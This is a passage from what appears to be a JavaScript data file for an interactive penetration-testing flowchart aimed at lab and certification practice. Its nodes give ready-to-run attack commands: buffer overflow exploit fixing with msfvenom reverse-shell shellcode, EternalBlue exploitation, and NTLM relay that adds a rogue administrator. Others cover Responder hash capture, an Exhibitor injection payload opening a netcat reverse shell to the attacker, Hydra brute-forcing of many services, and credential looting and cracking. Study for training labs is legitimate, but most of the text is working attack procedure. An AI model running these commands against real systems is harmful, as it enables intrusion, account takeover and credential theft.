curl -sv http://$ip | grep -i "content-security-policy"`,
    warn: null,
    choices: [
      { label: "Stole admin cookie — hijacked session", next: "file_upload" },
      { label: "No interesting cookies — pivot to other vectors", next: "web_fuzz_deep" },
    ],
  },

  searchsploit_web: {
    phase: "WEB",
    title: "Searchsploit / CVE Hunt",
    body: "Check every service version you found. ExploitDB, GitHub, Google. Read the exploit before running it — most need minor modification. ExploitDB and PacketStorm review code before hosting. GitHub does not — treat every GitHub exploit as untrusted until you've read it.",
    cmd: `searchsploit <service> <version>
searchsploit -m <id>         # copy to CWD — never modify originals in place
searchsploit -x <id>         # read in terminal before using
searchsploit --www <service> # open on exploit-db.com
searchsploit -s apache 2.4.49  # strict version match — no fuzzy range

# Best workflow: nmap XML output piped straight into searchsploit
nmap -p <PORTS> -sV -oX targeted.xml $ip
searchsploit --nmap targeted.xml
# reads every detected service/version and searches all at once

# Also check:
# https://github.com/search?q=CVE-XXXX-YYYY
# https://packetstormsecurity.com
# Google: "<service> <version> exploit site:github.com"

# Most Python exploits just need:
python3 exploit.py $ip $lhost $lport

# Decode suspicious hex arrays before trusting them:
python3 -c "print(b'\\x72\\x6d\\x20\\x2d\\x72\\x66...')"`,
    warn: "Read every exploit before running it. Modify LHOST/LPORT, fix paths, test it. Check for hardcoded ports — exploits assume default ports (James admin 4555, SMTP 25, etc). GitHub exploits are unreviewed — a real published exploit hid 'rm -rf ~ /*' inside a hex shellcode array. Decode any hex payload you don't recognize. Can't read the code? Test in a snapshot VM, never on your Kali host.",
    choices: [
      { label: "Found working exploit — got shell", next: "shell_upgrade" },
      { label: "Exploit staged — waiting for trigger", next: "trigger_dependent_rce" },
      { label: "Exploit needs fixing — C / compiled", next: "exploit_fix_c" },
      { label: "Exploit needs fixing — Python / web", next: "exploit_fix_web" },
      { label: "Service looks like custom app — try BOF", next: "bof" },
      { label: "Can deliver files to user — client-side", next: "client_side" },
      { label: "No exploit — back to brute force / creds", next: "bruteforce" },
    ],
  },

  trigger_dependent_rce: {
    phase: "WEB",
    title: "Trigger-Dependent RCE",
    body: "Some exploits don't give you a shell immediately — they stage a payload that fires when a user action occurs. Common patterns: file written to a home directory that executes on SSH login (.bashrc, .bash_profile), cron job that picks up a dropped file, service restart, or a user opening mail. The exploit reports success but nothing happens until the trigger fires. This is expected behavior — not a failure.",
    cmd: `# Stage your listener BEFORE running the exploit
nc -lvnp $lport

# Apache James 2.3.2 example — payload fires on SSH login
# After exploit runs: trigger it manually
ssh -p <james_ssh_port> <created_user>@$ip
# James creates a user via admin port, sends payload via SMTP
# Payload lands in user home dir and executes on next login

# If you can't SSH as that user, check for other login vectors:
# - POP3 login (port 110 or custom)
# - Any web login that triggers a shell
# - Check if a cron is already running as that user

# Confirm payload was staged — reconnect to admin port and verify user exists:
nc $ip <admin_port>
# login: james / james  (or root / root)
# listusers`,
    warn: "Don't wait 20 minutes staring at a listener. While it sits open: enumerate other services, check for creds, try SSH on both ports. If you can't force the trigger — note it, move on, come back. On exam day flag this box and check back after pivoting elsewhere.",
    choices: [
      { label: "Triggered — shell caught", next: "shell_upgrade" },
      { label: "Can't trigger — moving to next box", next: "start" },
    ],
  },

  exploit_fix_c: {
    phase: "WEB",
    title: "Fixing C Exploits — Buffer Overflow",
    body: "Stack-based BOF: user input overflows a fixed buffer and overwrites the return address on the stack. When ret executes, EIP is loaded from the stack — control the return address, control execution. Flow: (1) large buffer triggers overflow, (2) padding fills to correct offset, (3) return address overwritten with JMP ESP gadget, (4) ESP points into shellcode. Fix in order: cross-compile, IP/port, return address, shellcode, off-by-one.",
    cmd: `# -- Step 0: mirror exploit — never edit originals ----
searchsploit -m <id>

# -- Step 1: install cross-compiler -------------------
sudo apt install mingw-w64

# -- Step 2: compile for 32-bit Windows ---------------
i686-w64-mingw32-gcc exploit.c -o exploit.exe

# Error: undefined reference to WSAStartup / socket / connect
# Fix: link winsock library
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Error: undefined reference to pthread / ssl
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -lpthread

# 64-bit target:
x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32

# -- Step 3: fix hardcoded IP and port ----------------
grep -n "inet_addr\\|sin_port\\|htons" exploit.c
# inet_addr("x.x.x.x")  →  inet_addr("$ip")   // converts IP string to network addr
# htons(80)              →  htons(<port>)       // converts port to network byte order

# -- Step 4: return address ----------------------------
# Must point to a JMP ESP gadget so ret redirects into shellcode on stack.
#
# ASLR: system DLLs (ntdll, kernel32) randomize at every boot — never use them.
# Use non-ASLR modules inside the vulnerable application only.
#
# Check in Immunity Debugger: View → Executable Modules
# Confirm target module has no ASLR / SafeSEH
#
# If exploit DLL is absent on target (e.g. msvbvm60.dll):
#   → Check Python version of same exploit for a verified working address
#   → Clone target environment in VM, attach debugger, find JMP ESP manually
#   → Or copy target DLLs to Kali and search with objdump:
objdump -D target.dll | grep -i "jmp.*esp"
#
# Update return address in C code:
unsigned char retn[] = "\\x83\\x0c\\x09\\x10"; // JMP ESP @ 0x10090c83

# -- Step 5: replace shellcode -------------------------
# Public exploits contain obfuscated hex payloads — always replace.
# Bad chars are usually listed in the exploit comments.
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d"
# Paste buf[] into shellcode[] array, keep NOP sled (\\x90 * 16) before payload

# -- Step 6: off-by-one null byte fix ------------------
# Symptom: EIP is overwritten but bytes are rotated by one
#   Expected: 0x10090c83  →  Got: 0x9010090c
#
# Cause: C strings are null-terminated. This memset call sets
# the last byte of padding to 0x00:
#   memset(padding + initial_buffer_size - 1, 0x00, 1);
# So strcat sees a 779-byte string instead of 780 — offset shifts by 1.
#
# Fix: increase initial_buffer_size by 1
int initial_buffer_size = 781;  // was 780

# -- Step 7: run Windows binary from Kali -------------
# wine = compatibility layer for running Windows PE on Linux
sudo wine exploit.exe`,
    warn: "Never edit in /usr/share/exploitdb/ — searchsploit -m first. JMP ESP must come from a non-ASLR module in the vulnerable app itself. If the DLL in the exploit isn\'t loaded on your target (View → Executable Modules in Immunity), it will crash not shell. Rotated EIP = off-by-one null byte — increase buffer size by 1.",
    choices: [
      { label: "Compiled and working — got shell", next: "shell_upgrade" },
      { label: "Back to exploit search", next: "searchsploit_web" },
    ],
  },

  exploit_fix_web: {
    phase: "WEB",
    title: "Fixing Web / Python Exploits",
    body: "Web exploits don't need cross-compilation — the work is reading the code and matching it to your target. Primary technique: pdb breakpoints + Burp proxy to see exactly what the script is sending and receiving. Six questions first: (1) HTTP or HTTPS? (2) Correct URL path/route? (3) Pre-auth or post-auth? (4) Credentials correct? (5) CSRF token param name match? (6) WAF or self-signed cert?",
    cmd: `# -- pyfix — convert py2 first if needed --------------
pyfix exploit.py --dry-run    # audit before writing
pyfix exploit.py              # convert → exploit_py3.py
pyfix exploit.py --add-verify # inject verify=False everywhere

# -- PRIMARY DEBUG TECHNIQUE 1: print before crash ----
# OffSec method — simplest, no imports needed
# Add a print just before the line that errors:
def parse_csrf_token(location):
    print("[+] Location header: " + str(location))   # add this
    return location.split(csrf_param + "=")[1]        # crashing here

# Run exploit — read the print output:
# [+] Location header: http://$ip/cmsms/admin?_sk_=421a821b88
# Exploit expected: csrf_param = "__c"
# Server sent:      _sk_
# Fix: csrf_param = "_sk_"

# -- PRIMARY DEBUG TECHNIQUE 2: pdb ----------------------
# pdb stops execution at the exact line you choose.
# Use it at any crash or silent failure to inspect variables.

# Step 1 — import at top of exploit
import pdb

# Step 2 — set breakpoint just before the failing line
def parse_csrf_token(location):
    pdb.set_trace()           # execution stops here
    return location.split(csrf_param + "=")[1]

# Step 3 — run the exploit normally
python3 exploit.py

# Step 4 — at the (Pdb) prompt, inspect variables:
p location                   # print the variable
p csrf_param                 # see what it expects
p response.headers           # dump all headers
p response.status_code       # check the response code
p response.text[:500]        # first 500 chars of body
n                            # next line
c                            # continue execution
q                            # quit pdb

# Real example — CSRF param mismatch (CMS Made Simple):
# (Pdb) p location
# 'http://$ip/cmsms/admin?_sk_=421a821b88d7183735c'
# exploit had csrf_param = "__c" but server sends _sk_
# Fix: csrf_param = "_sk_"

# -- PARALLEL TECHNIQUE: Burp proxy -------------------
# Run Burp in parallel to see the actual HTTP traffic.
# Add to exploit (insert near requests.post calls):
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
response = requests.post(url, data=data, allow_redirects=False, proxies=proxies)
# Now Burp intercepts every request — compare to what exploit expects

# -- locate — find files on the target -----------------
# Once you have a shell, locate helps find config/creds fast
locate config.php
locate wp-config.php
locate *.conf | grep -v proc
locate id_rsa
locate .env
locate *.bak
# If locate db is stale:
updatedb && locate passwd

# -- Step 1: Update IP and path ------------------------
grep -n "base_url\\|http\\|url\\|host\\|ip" exploit.py | head -20
# base_url = "http://$ip/cmsms/admin"  ← match exactly

# -- Step 2: SSL verify=False --------------------------
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.post(url, data=data, verify=False)

# -- Step 3: Credentials -------------------------------
grep -n "username\\|password\\|admin" exploit.py

# -- Step 4: CSRF token param mismatch -----------------
# Symptom: IndexError: list index out of range on .split()
# Auth succeeds but token parse fails — most common bug
# pdb is the fastest fix — see PRIMARY DEBUG above

# -- Step 5: URL path ----------------------------------
# App may be at /cmsms, /app, /cms — not root
grep -n "path\\|route\\|upload\\|login" exploit.py | head -10

# -- Step 6: base64 / bytes in py3 ---------------------
# base64.b64encode() takes bytes in py3
b64 = base64.b64encode(txt_filename.encode()).decode()

# -- Validate webshell ---------------------------------
curl -k http://$ip/uploads/shell.php?cmd=whoami
curl -k "http://$ip/shell.php?cmd=id;hostname"

# -- elFinder pattern (file manager exploits) ---------
# Exploit requires knowing app base URL -- not always /
# Step 1: dir brute to find app base
feroxbuster -u http://$ip \\
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\
  --depth 2 -o ferox_dirs.txt
# Step 2: update base_url in exploit to found path
# Step 3: some exploits require a local JPEG file
#   Read exploit header -- it will specify the filename
#   cp /usr/share/pixmaps/kali-menu.png ./shell.jpg
# Step 4: run and catch shell

# -- msfvenom for web exploits needing reverse shell ---
# EXITFUNC=thread -- keeps app stable after shell exits
msfvenom -p linux/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f py
msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -f py`,
    warn: "pdb is the fastest way to understand any crash — set the breakpoint one function above the error, not on the crashing line itself. CSRF param mismatch is the #1 silent failure after auth succeeds — the exploit author hardcoded a param name that doesn't match your target. Always check the Location header. Burp + pdb together is the full picture: pdb shows Python state, Burp shows what actually hit the wire.",
    choices: [
      { label: "Fixed and working — got shell", next: "shell_upgrade" },
      { label: "Got webshell — need reverse shell", next: "reverse_shell" },
      { label: "Back to exploit search", next: "searchsploit_web" },
    ],
  },


  smb_enum: {
    phase: "SMB",
    title: "SMB Enumeration",
    body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
    cmd: `# ── BASIC ENUM ────────────────────────────────────────
enum4linux-ng -A $ip | tee smb_enum.txt
nmap -p 445 -sV $ip

# ── NULL / GUEST SESSION ──────────────────────────────
crackmapexec smb $ip -u '' -p '' --shares
crackmapexec smb $ip -u 'guest' -p '' --shares
crackmapexec smb $ip -u '' -p '' --users
crackmapexec smb $ip -u '' -p '' --groups
crackmapexec smb $ip -u '' -p '' --pass-pol

# List + browse shares
smbclient -L //$ip -N
smbclient //$ip/share -N

# ── SMB SIGNING CHECK (relay attack prerequisite) ─────
crackmapexec smb $ip --gen-relay-list relay_targets.txt
nmap -p 445 --script smb2-security-mode $ip
# If "Message signing enabled but not required" = relay possible

# ── NTLM RELAY ATTACK ─────────────────────────────────
# Step 1: check signing disabled
# Step 2: on Kali — start responder (disable SMB/HTTP)
# Edit /etc/responder/Responder.conf: SMB=Off, HTTP=Off
sudo responder -I tun0 -rdw
# Step 3: ntlmrelayx — relay to target
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# With command execution:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker pass123! /add && net localgroup administrators hacker /add"
# Step 4: trigger auth — wait or coerce via printerbug/petitpotam

# ── NET-NTLMv2 CAPTURE (Responder) ───────────────────
# Start responder to capture hashes
sudo responder -I tun0 -rdwv
# Hashes saved to /usr/share/responder/logs/
# Crack captured hash:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# ── VULN SCAN ─────────────────────────────────────────
nmap -p 445 --script smb-vuln-ms17-010 $ip
nmap -p 445 --script smb-vuln-ms08-067 --script-args=unsafe=1 $ip
nmap -Pn -sV -p 445 \\
  "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" \\
  --script-args=unsafe=1 -oN nse_smb.txt $ip

# ── WITH CREDS ────────────────────────────────────────
crackmapexec smb $ip -u user -p 'password' --shares
crackmapexec smb $ip -u user -p 'password' --users
crackmapexec smb $ip -u user -p 'password' --sam
crackmapexec smb $ip -u user -p 'password' --lsa
crackmapexec smb $ip -u user -p 'password' -x "whoami"
crackmapexec smb $ip -u user -p 'password' -X "Get-LocalUser"`,
    warn: null,
    choices: [
      { label: "MS17-010 / EternalBlue vulnerable", next: "eternalblue" },
      { label: "Signing disabled — NTLM relay", next: "smb_relay" },
      { label: "Captured Net-NTLMv2 — crack it", next: "hashcrack" },
      { label: "Readable shares — download everything", next: "smb_loot" },
      { label: "Got creds — PTH or spray", next: "pth" },
      { label: "Got usernames — brute force", next: "bruteforce" },
    ],
  },

  eternalblue: {
    phase: "SMB",
    title: "EternalBlue (MS17-010)",
    body: "Manual exploitation only — no Metasploit. AutoBlue is clean and reliable. Read the script before running.",
    cmd: `# AutoBlue-MS17-010 (manual, no MSF)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
pip install -r requirements.txt

# Generate shellcode
chmod +x shellcode/shell_prep.sh
./shellcode/shell_prep.sh
# Enter LHOST + LPORT when prompted

# Start listener
nc -nlvp $lport

# Fire exploit
python3 eternalblue_exploit7.py $ip shellcode/sc_x64.bin

# If x64 fails, try x86
python3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin`,
    warn: "AutoBlue can crash the target if it's unstable. Revert the machine if it goes unresponsive.",
    choices: [
      { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
      { label: "Exploit unstable — try manual MS17-010 PoC", next: "searchsploit_web" },
    ],
  },

  smb_relay: {
    phase: "SMB",
    title: "NTLM Relay Attack",
    body: "SMB signing disabled = relay NTLMv2 hashes to other machines instead of cracking them. Requires at least two targets. ntlmrelayx does the heavy lifting.",
    cmd: `# ── PREREQUISITES ────────────────────────────────────
# 1. SMB signing disabled on target (not required)
crackmapexec smb $ip/24 --gen-relay-list relay_targets.txt
cat relay_targets.txt

# ── STEP 1: CONFIGURE RESPONDER ──────────────────────
# Turn OFF SMB and HTTP in responder (we relay, not capture)
sudo nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off
sudo responder -I tun0 -rdwv

# ── STEP 2: START NTLMRELAYX ─────────────────────────
# Basic relay — dumps SAM if admin
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# With command execution (add admin user)
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker pass123! /add"
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net localgroup administrators hacker /add"

# Interactive shell mode
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Then: nc 127.0.0.1 <port shown>

# Relay to LDAP (for AD attacks)
impacket-ntlmrelayx -t ldap://dc01 -smb2support --no-dump

# ── STEP 3: TRIGGER AUTHENTICATION ───────────────────
# Wait for user to connect to a UNC path
# Or coerce via:
# PrinterBug:
impacket-printerbug domain/user:pass@$ip $lhost
# PetitPotam (no creds needed):
python3 PetitPotam.py $lhost $ip

# ── STEP 4: CHECK RESULTS ────────────────────────────
# ntlmrelayx dumps SAM hashes if relay successful
# Use dumped hashes for PTH`,
    warn: "Both machines must have SMB signing disabled/not required. Cannot relay to the same machine the hash came from.",
    choices: [
      { label: "Got SAM hashes — PTH", next: "pth" },
      { label: "Command executed — got shell", next: "windows_post_exploit" },
      { label: "Relay failed — crack hash instead", next: "hashcrack" },
    ],
  },

  smb_loot: {
    phase: "SMB",
    title: "SMB Loot",
    body: "Recursively download everything. Grep for credentials, keys, configs. Don't read files one by one — bulk download and grep.",
    cmd: `# Recursive download
smbclient //$ip/share -N \\
  -c 'recurse ON; prompt OFF; mget *'

# Mount the share
sudo mount -t cifs //$ip/share /mnt/share \\
  -o username=,password=,vers=2.0

# Bulk grep for creds
grep -rih "password\\|passwd\\|secret\\|api_key\\|token\\|credential" /mnt/share/
find /mnt/share -name "*.xml" -o -name "*.config" \\
  -o -name "*.ini" -o -name "*.txt" \\
  -o -name "*.ps1" -o -name "*.bat" \\
  | xargs grep -il "pass" 2>/dev/null`,
    warn: null,
    choices: [
      { label: "Found credentials", next: "creds_found" },
      { label: "Found scripts/code — review them", next: "code_review" },
      { label: "Found SSH key", next: "ssh_key" },
    ],
  },

  code_review: {
    phase: "SMB",
    title: "Code / Script Review",
    body: "Scripts and executables on shares are often goldmines. Hardcoded creds, command execution, scheduled task payloads.",
    cmd: `# Grep for hardcoded creds
grep -rih "password\\|passwd\\|secret\\|key\\|token" . 2>/dev/null

# Grep for execution / injection
grep -rih "exec\\|system\\|popen\\|eval\\|invoke" . 2>/dev/null

# Strings on binaries
strings binary_file | grep -i "pass\\|user\\|http\\|key"

# Decompile .NET assemblies
ilspycmd binary.dll > output.cs
dnspy binary.exe   # GUI`,
    warn: null,
    choices: [
      { label: "Found hardcoded credentials", next: "creds_found" },
      { label: "Found command execution vector", next: "cmd_injection" },
    ],
  },

  // ==========================================
  //  FTP
  // ==========================================
  ftp_enum: {
    phase: "FTP",
    title: "FTP Enumeration",
    body: "Anonymous login is more common than people expect. If writable AND web-accessible, you can drop a shell directly.",
    cmd: `# Anonymous login test
ftp $ip
# Try: anonymous / anonymous
#      anonymous / (blank)

# Nmap scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst -p 21 $ip

# If login works — download everything
ftp> binary
ftp> mget *
ftp> passive

# If FTP dir is under webroot — upload shell
ftp> put shell.php`,
    warn: null,
    choices: [
      { label: "Anonymous access — found interesting files", next: "smb_loot" },
      { label: "FTP writable + webroot accessible = shell", next: "reverse_shell" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  // ==========================================
  //  SSH
  // ==========================================
  ssh_only: {
    phase: "SSH",
    title: "SSH Only Exposed",
    body: "SSH alone is rarely the initial attack vector. You need creds or a key from somewhere. Check non-standard web ports — something else is almost always running.",
    cmd: `# Check non-standard ports
nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $ip

# SSH version / algo audit
ssh-audit $ip

# Banner grab
nc -nv $ip 22

# Username enum (if older OpenSSH)
ssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $ip`,
    warn: "Brute forcing SSH without a targeted username list is almost never the path.",
    choices: [
      { label: "Found web on non-standard port", next: "web_enum" },
      { label: "Got creds from elsewhere — SSH in", next: "linux_post_exploit" },
      { label: "Got SSH key", next: "ssh_key" },
    ],
  },

  ssh_key: {
    phase: "SSH",
    title: "SSH Key Found",
    body: "Always check permissions first — SSH will refuse a key that's world-readable. If passphrase-protected, crack it with ssh2john.",
    cmd: `chmod 600 id_rsa
ssh -i id_rsa user@$ip
ssh -i id_rsa -o StrictHostKeyChecking=no user@$ip

# Crack passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt

# Try all users from /etc/passwd
for user in $(cat users.txt); do
  ssh -i id_rsa $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
done`,
    warn: null,
    choices: [
      { label: "SSH'd in — Linux privesc", next: "linux_post_exploit" },
      { label: "Cracking passphrase", next: "hashcrack" },
    ],
  },

  // ==========================================
  //  OTHER SERVICES
  // ==========================================
  other_services: {
    phase: "RECON",
    title: "Other Services",
    body: "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
    cmd: `# ── GOAHEAD WEBSERVER — EMBEDDED/INDUSTRIAL SOFTWARE ──
# nmap fingerprint: GoAhead-Webs or GoAhead WebServer
# Signals embedded device, industrial control, or management software
# Almost always old CVEs — searchsploit immediately
# Common applications on GoAhead:
# HP Power Manager  → default admin:admin → buffer overflow RCE
# IP cameras, NAS, UPS management consoles
# Lab validated: Kevin (PG Practice) — admin:admin → MSF → SYSTEM
searchsploit hp power manager
# msfconsole → search hp power manager → use → set rhosts/lhost/lport → run

# ── .NET REMOTING (17001 / custom port) ──────────────
# nmap labels this: "MS .NET Remoting services"
# Vulnerable to deserialization attacks
# Check searchsploit for the service running on it (e.g. SmarterMail)
# CVE-2019-7214: SmarterMail < build 6985
# Port in exploit = .NET remoting port (17001) NOT the web UI port (9998)
# Exploit output is silent — feedback only via nc listener
searchsploit smartermail
# python3 49216.py  (edit HOST, PORT=17001, LHOST, LPORT)

# ── ZOOKEEPER + EXHIBITOR (2181 / 8080 / 8081) ──────
# Zookeeper on 2181 = look for Exhibitor Web UI on 8080/8081
# Exhibitor = ZooKeeper supervisor with NO AUTHENTICATION by default
# nmap: http-title redirect to /exhibitor/v1/ui/index.html = vulnerable
# CVE-2019-5029 — command injection via java.env script field
# Affects all versions — no auth + no input validation
# Lab validated: Pelican (PG Play)

# Manual exploit (browser):
# 1. Browse to http://$ip:8080/exhibitor/v1/ui/index.html
# 2. Config tab → flip Editing to ON
# 3. java.env script field → enter: $(/bin/nc -e /bin/sh $lhost $lport &)
# 4. Commit → All At Once → OK → wait up to 1 minute

# curl exploit:
# curl -X POST -d @data.json http://$ip:8080/exhibitor/v1/config/set
# data.json: {"javaEnvironment":"$(/bin/nc -e /bin/sh $lhost $lport &)",...}
# Port may be 8081 (nginx proxy) or 8080 (direct) — try both

# ── SNMP — community string brute + walk
# snmp-check dumps FULL process list — confirms what's actually running
# Lab: ClamAV box — snmp-check confirmed clamav-milter + inetd before exploit
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $ip
snmpwalk -c public -v1 $ip
snmp-check $ip

# DNS zone transfer
dig axfr @$ip domain.com
host -l domain.com $ip
dnsrecon -d domain.com -t axfr

# LDAP anonymous bind
ldapsearch -x -h $ip -b "dc=domain,dc=com"
ldapsearch -x -h $ip -b "" -s base namingContexts

# RPC null session
rpcclient -U "" $ip
> enumdomusers
> enumdomgroups
> queryuser <RID>

# NFS shares
showmount -e $ip`,
    warn: null,
    choices: [
      { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
      { label: "SMTP open — enumerate users", next: "smtp_enum" },
      { label: "DNS — try zone transfer", next: "dns_enum" },
      { label: "Domain info found — pivot to AD", next: "ad_start" },
      { label: "NFS share found — mount it", next: "nfs_enum" },
    ],
  },

  // ==========================================
  //  BRUTE FORCE / CREDS
  // ==========================================
  password_attacks: {
    phase: "CREDS",
    title: "Password Attacks",
    body: "Three phases — know which one you're in. Online attacks hit live services and are slow and noisy. Offline cracking is fast, silent, and unlimited. Wordlist building multiplies the effectiveness of both.",
    cmd: `# ── WHICH PHASE ARE YOU IN? ──────────────────────────
#
# ONLINE (live service) → brute_force
#   You have a running service (SSH, RDP, HTTP, SMB, FTP)
#   You need to find valid credentials
#   Hydra / Medusa / NetExec
#   Risk: lockout, noise, rate limiting
#
# OFFLINE (hash cracking) → hashcrack
#   You have a hash from /etc/shadow, SAM, NTDS, DB dump
#   You need the plaintext behind the hash
#   Hashcat / John — no network, no lockout risk
#   Speed depends on hash type + hardware
#
# WORDLIST BUILDING → wordlist_build
#   rockyou isn't finding it
#   You have context — found passwords, password policy, target name
#   Build targeted wordlist + rules to multiply coverage
#
# ── CRACKING TIME ESTIMATE ────────────────────────────
# cracking_time = keyspace / hash_rate
# keyspace = charset_size ^ password_length
python3 -c "print(62**8)"          # 8-char alphanumeric keyspace
python3 -c "print(62**8 / 9276300000)"  # seconds on RTX 3090 SHA256
#
# Rule of thumb:
# MD5/NTLM   < 8 chars  → seconds on GPU
# SHA256     < 8 chars  → minutes on GPU
# bcrypt     any length → hours/days even on GPU
# SHA512crypt (Linux $6$) → slow, use rules not brute`,
    warn: null,
    choices: [
      { label: "Online — brute force live service", next: "bruteforce" },
      { label: "Offline — crack a hash", next: "hashcrack" },
      { label: "Build better wordlist / rules", next: "custom_wordlist" },
      { label: "Back to jump menu", next: "jump_menu" },
    ],
  },

  bruteforce: {
    phase: "CREDS",
    title: "Brute Force / Password Spray",
    body: "Know the difference — brute force tries many passwords against one user, spray tries one password against many users. AD environments lock out after 3-5 attempts. Always spray, never brute, against AD. Build a targeted wordlist with CeWL before throwing rockyou.",
    cmd: `# ── BUILD TARGETED WORDLIST FIRST ────────────────────
cewl http://$ip -d 3 -m 5 -w custom.txt
# Combine with rockyou top 1000 for best coverage:
head -1000 /usr/share/wordlists/rockyou.txt >> custom.txt

# ── SSH ───────────────────────────────────────────────
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
  ssh://$ip -t 4 -o hydra_ssh.txt
# Single user
hydra -l root -P /usr/share/wordlists/rockyou.txt \\
  ssh://$ip -t 4

# ── RDP (3389) ────────────────────────────────────────
# -t 4 and -W 3 required — RDP hates parallel connections
hydra -L users.txt -p 'KnownPassword' rdp://$ip -t 4 -W 3
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \\
  rdp://$ip -t 4 -W 3
# "account not active for remote desktop" = valid creds, no RDP perms
# → try those creds on SMB/WinRM before giving up
# medusa as fallback if hydra RDP module errors:
medusa -h $ip -u administrator -P rockyou.txt -M rdp -t 1

# ── SMB (445) ─────────────────────────────────────────
hydra -L users.txt -P rockyou.txt smb://$ip
# CME spray — safer for AD (one password at a time)
nxc smb $ip -u users.txt -p 'Password123' --continue-on-success
nxc smb $ip -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# --no-bruteforce = spray mode (user1:pass1, user2:pass2 — not all combos)

# ── WinRM (5985) ──────────────────────────────────────
hydra -L users.txt -P rockyou.txt winrm://$ip -t 4
nxc winrm $ip -u users.txt -p 'Password123' --continue-on-success

# ── FTP (21) ──────────────────────────────────────────
hydra -L users.txt -P rockyou.txt ftp://$ip -t 4
hydra -l anonymous -P rockyou.txt ftp://$ip -t 4

# ── HTTP Basic Auth (browser popup) ───────────────────
hydra -l admin -P rockyou.txt $ip http-get / -t 4 -V
# embed in URL for Burp once cracked: http://admin:pass@$ip/

# ── HTTP POST Form ────────────────────────────────────
hydra -l admin -P rockyou.txt $ip \\
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -t 4 -V

# ── SMTP (25) ─────────────────────────────────────────
hydra -L users.txt -P rockyou.txt smtp://$ip -t 4
# User enum via VRFY first:
smtp-user-enum -M VRFY -U users.txt -t $ip

# ── MySQL (3306) ──────────────────────────────────────
hydra -l root -P rockyou.txt mysql://$ip -t 4
nxc mssql $ip -u sa -p rockyou.txt  # MSSQL

# ── VNC (5900) ────────────────────────────────────────
hydra -P rockyou.txt vnc://$ip -t 4
# VNC has no username — password only

# ── SPRAY WORDLIST — safe for AD ──────────────────────
# One password per user, check lockout first
# Common spray passwords:
# Season+Year:  Spring2024!  Winter2025!
# Company name: Company123!
# Common:       Password1  Welcome1  P@ssw0rd
net accounts /domain   # check lockout threshold on Windows
nxc smb $ip -u user -p 'Password1' 2>/dev/null | grep -v FAILURE`,
    warn: "Check lockout policy BEFORE spraying AD — 'net accounts /domain' or crackmapexec. Getting accounts locked will burn your exam. RDP hydra module is experimental — use -t 4 -W 3 always. 'Account not active for remote desktop' means the password IS correct — spray those creds on SMB and WinRM immediately.",
    choices: [
      { label: "Got credentials!", next: "creds_found" },
      { label: "No luck — check service versions", next: "version_ref" },
      { label: "AD environment — careful with lockout", next: "ad_spray" },
    ],
  },


  hashcrack: {
    phase: "CREDS",
    title: "Hash Cracking — Offline",
    body: "5-step methodology: (1) Extract hash, (2) Identify type + format, (3) Estimate cracking time, (4) Prepare wordlist, (5) Attack. Wrong hash mode = wasted time. Always verify the format before running.",
    cmd: `# ── STEP 1: IDENTIFY HASH TYPE ───────────────────────
hash-identifier <hash>
hashid <hash>
# Online: https://hashes.com/en/tools/hash_identifier

# ── STEP 2: FORMAT FOR HASHCAT ────────────────────────
# Remove any "filename:" prefix added by *2john tools
# Extra spaces or newlines break cracking — copy carefully

# Transform file formats:
keepass2john Database.kdbx > keepass.hash   # remove "Database:" prefix
ssh2john id_rsa > ssh.hash                  # remove "id_rsa:" prefix
zip2john archive.zip > zip.hash
office2john doc.docx > doc.hash

# ── STEP 3: HASH MODULE REFERENCE ────────────────────
# MD5              = -m 0
# SHA1             = -m 100
# SHA256           = -m 1400
# NTLM             = -m 1000
# NetNTLMv2        = -m 5600
# sha512crypt $6$  = -m 1800   (Linux /etc/shadow)
# bcrypt $2y$      = -m 3200
# Kerberoast       = -m 13100
# AS-REP           = -m 18200
# KeePass 2 (AES)  = -m 13400
# SSH key ($6$)    = -m 22921
# SSH key ($0$)    = -m 22911
# SSH key ($1/$3$) = -m 22931
# Find any mode:
hashcat --help | grep -i "keepass"
hashcat --help | grep -i "ssh"

